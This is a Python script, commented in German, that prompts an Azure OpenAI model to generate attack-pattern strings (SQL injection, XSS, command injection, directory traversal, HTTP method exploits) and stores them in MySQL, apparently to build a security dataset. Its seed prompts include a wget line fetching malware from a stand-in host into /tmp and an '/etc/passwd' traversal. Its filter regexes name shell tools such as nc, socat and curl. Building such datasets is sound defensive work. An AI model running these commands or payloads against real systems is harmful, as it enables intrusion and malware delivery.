# File: log_attack_gen.py

import os
import requests
import re
import random
import time
import mysql.connector
from collections import Counter

# Konfigurierbare Wartezeiten
SHORT_DELAY = 1  # Sekunden zwischen erfolgreichen Anfragen
LONG_DELAY = 30  # Sekunden bei einem Fehler, bevor erneut versucht wird

# Logging-Funktion
def log(message, level="INFO"):
    levels = {"INFO": "[INFO]", "WARNING": "[WARNING]", "ERROR": "[ERROR]"}
    prefix = levels.get(level, "[INFO]")
    print(f"{prefix} {message}")

# Azure OpenAI-Konfigurationsvariablen
AZURE_OPENAI_API_KEY = os.getenv("AZURE_OPENAI_API_KEY")
AZURE_OPENAI_ENDPOINT = os.getenv("AZURE_OPENAI_ENDPOINT")
AZURE_API_VERSION = "2023-05-15"
GPT_DEPLOYMENT_NAME = "gpt-4o"

# MySQL-Datenbankkonfiguration
DB_HOST = "localhost"
DB_USER = "root"
DB_NAME = "log_generator"
DESIRED_NUM_ENTRIES = 100

# Verbindung zur Datenbank herstellen
def connect_to_db():
    try:
        conn = mysql.connector.connect(
            host=DB_HOST,
            user=DB_USER,
            database=DB_NAME
        )
        log("Datenbankverbindung erfolgreich hergestellt.", "INFO")
        return conn
    except mysql.connector.Error as err:
        log(f"Fehler bei der Verbindung zur Datenbank: {err}", "ERROR")
        raise SystemExit

# Tabelle erstellen
def create_table_if_not_exists(table_name):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute(f"""
        CREATE TABLE IF NOT EXISTS {table_name} (
            id INT AUTO_INCREMENT PRIMARY KEY,
            entry TEXT NOT NULL UNIQUE
        )
    """)
    conn.commit()
    cursor.close()
    conn.close()
    log(f"Tabelle '{table_name}' erstellt oder existiert bereits.", "INFO")

# Einträge laden
def load_existing_entries(table_name):
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute(f"SELECT entry FROM {table_name}")
    results = [row[0] for row in cursor.fetchall()]
    cursor.close()
    conn.close()
    log(f"{len(results)} Einträge aus Tabelle '{table_name}' geladen.", "INFO")
    return results

# Neue Einträge in die Datenbank einfügen
def save_entries_to_db(table_name, entries):
    conn = connect_to_db()
    cursor = conn.cursor()
    successful_inserts = 0
    for entry in entries:
        try:
            # Vermeidung von Überschreibungen
            cursor.execute(f"INSERT IGNORE INTO {table_name} (entry) VALUES (%s)", (entry,))
            if cursor.rowcount > 0:
                successful_inserts += 1
        except mysql.connector.Error as err:
            log(f"Fehler beim Einfügen von Eintrag '{entry}': {err}", "ERROR")
    conn.commit()
    cursor.close()
    conn.close()
    log(f"{successful_inserts} Einträge in Tabelle '{table_name}' gespeichert.", "INFO")

# Anfrage an Azure OpenAI senden
def send_chat_request(prompt):
    headers = {
        "Content-Type": "application/json",
        "api-key": AZURE_OPENAI_API_KEY
    }
    payload = {
        "messages": [
            {"role": "system", "content": "Generiere einzigartige Einträge im angegebenen Format."},
            {"role": "user", "content": prompt}
        ]
    }
    url = f"{AZURE_OPENAI_ENDPOINT}/openai/deployments/{GPT_DEPLOYMENT_NAME}/chat/completions?api-version={AZURE_API_VERSION}"

    while True:
        try:
            log(f"Sende Anfrage an Azure OpenAI mit Prompt: {prompt}", "INFO")
            response = requests.post(url, headers=headers, json=payload)
            response.raise_for_status()
            data = response.json()
            log(f"Antwort erhalten: {data['choices'][0]['message']['content']}", "INFO")
            time.sleep(SHORT_DELAY)  # Kurze Pause nach einer erfolgreichen Anfrage
            return data["choices"][0]["message"]["content"]
        except requests.exceptions.RequestException as e:
            log(f"Fehler bei der Anfrage: {e}", "ERROR")
            log("Warte auf erneute Anfrage...", "INFO")
            time.sleep(LONG_DELAY)  # Lange Pause bei einem Fehler

# Einträge generieren
def generate_attack_patterns(attack_type, table_name, prompt_template, regex):
    create_table_if_not_exists(table_name)
    existing_entries = set(load_existing_entries(table_name))
    repeated_entries = Counter()

    while len(existing_entries) < DESIRED_NUM_ENTRIES:
        prompt = (
            prompt_template
            + "\nBereits vorhandene Einträge:\n"
            + "\n".join(random.sample(list(existing_entries), min(len(existing_entries), 10)))
            + "\nVermeide diese Einträge:\n"
            + "\n".join(f"{entry} ({count}x)" for entry, count in repeated_entries.items() if count > 1)
        )
        response = send_chat_request(prompt)

        # Neue Einträge anhand der Regex filtern
        new_entries = []
        for line in response.splitlines():
            line = line.strip()
            if re.search(regex, line):
                if line in existing_entries:
                    repeated_entries[line] += 1
                    log(f"Doppelter Eintrag entdeckt: {line}", "WARNING")
                else:
                    new_entries.append(line)
                    existing_entries.add(line)
            else:
                log(f"Ungültiger Eintrag: {line}", "WARNING")

        # Neue Einträge speichern
        if new_entries:
            save_entries_to_db(table_name, new_entries)
        log(f"{len(existing_entries)} Einträge für '{attack_type}' generiert.", "INFO")

# Hauptprogramm
if __name__ == "__main__":
    attack_configs = [
        {
            "type": "SQL Injection",
            "table": "sql_injection_logs",
            "prompt": "Generiere realistische SQL-Injection-Muster (zu Sicherheitszwecken) wie: 'SELECT * FROM users WHERE username = 'admin' -- '",
            # Akzeptiert typische SQL-Befehle und Kommentare
            "regex": r"(?i)(--|;|'|\bUNION\b|\bSELECT\b|\bINSERT\b|\bINTO\b|\bDROP\b|\bDELETE\b|\bUPDATE\b|\bSET\b|\bWHERE\b|\bAND\b|\bOR\b|\bLIKE\b|\bEXISTS\b|\bHAVING\b|\bORDER\s+BY\b|\bGROUP\s+BY\b|\bEXEC\b|\bSLEEP\b|\bXP_CMDSHELL\b|\bINFORMATION_SCHEMA\b|\bCHAR\b|\bCONCAT\b|\bSUBSTRING\b|\bVERSION\b|\bDATABASE\b|\bTABLE\b|\bCOLUMN\b|\bAVG\b|\bCOUNT\b|\bMAX\b|\bMIN\b|\bTOP\b)"
        },
        {
            "type": "XSS",
            "table": "xss_logs",
            "prompt": "Generiere realistische XSS-Payloads (zu Sicherheitszwecken) wie: '<script>alert(1)</script>'",
            # Akzeptiert typische XSS-Skripte
            "regex": r"<script>.*</script>|<.*on\w+=.*>|.*javascript:.*"
        },
        {
            "type": "Command Injection",
            "table": "command_injection_logs",
            "prompt": "Generiere realistische Command-Injection-Muster (zu Sicherheitszwecken) wie: 'wget http://malicious.com -O /tmp/malware'",
            # Akzeptiert Befehle und typische Unix-Kommandos
            "regex": r"(?i)(;|\||&&|>|<|wget|curl|bash|sh|rm|chmod|cat|scp|ssh|nc|python|perl|php|exec|system|socat|tftp|telnet|ftp).*"
        },
        {
            "type": "Directory Traversal",
            "table": "directory_traversal_logs",
            "prompt": "Generiere realistische Directory-Traversal-Muster (zu Sicherheitszwecken) wie: '../../etc/passwd'",
            # Akzeptiert Pfade mit '../'
            "regex": r"\.\./.*|/\.\./.*"
        },
        {
            "type": "HTTP Method Exploits",
            "table": "http_method_exploit_logs",
            "prompt": "Generiere realistische HTTP-Exploits (zu Sicherheitszwecken) wie: 'DELETE /important-data HTTP/1.1'",
            # Akzeptiert HTTP-Methoden und URLs
            "regex": r"(?is).*(GET|POST|PUT|DELETE|HEAD|OPTIONS|TRACE|CONNECT).*HTTP\/1\.[01].*"
        }
    ]

    print("Welche Angriffsmuster sollen generiert werden?")
    for idx, config in enumerate(attack_configs):
        print(f"{idx + 1}: {config['type']}")

    choice = int(input(f"Ihre Auswahl (1-{len(attack_configs)}): ").strip()) - 1

    if 0 <= choice < len(attack_configs):
        selected_config = attack_configs[choice]
        generate_attack_patterns(
            selected_config["type"],
            selected_config["table"],
            selected_config["prompt"],
            selected_config["regex"]
        )
    else:
        log("Ungültige Auswahl. Das Programm wird beendet.", "ERROR")

    log("Angriffsmuster-Generierung abgeschlossen.", "INFO")
